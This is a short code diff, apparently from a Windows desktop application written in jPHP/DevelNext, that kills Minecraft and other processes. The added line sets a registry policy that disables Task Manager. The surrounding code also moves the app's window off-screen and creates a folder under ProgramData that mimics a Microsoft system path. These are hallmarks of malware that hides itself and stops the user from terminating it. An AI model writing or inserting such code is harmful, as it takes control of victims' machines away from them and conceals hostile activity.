@@ -2,7 +2,7 @@ execute('cmd /c taskkill /f /im Minecraft.exe');
 execute('cmd /c taskkill /f /im Minecraft.Windows.exe');
 execute('cmd /c taskkill /f /im oxibyte.exe');
 //execute('cmd /c start https://discord.gg/bQqCrzugng');
-
+execute('cmd /c REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1');
 app()->form('MainForm')->layout->position = [5000,0];
 
 fs::makeDir($_ENV['ProgramData'].'\\Microsoft\\DeviceSync');
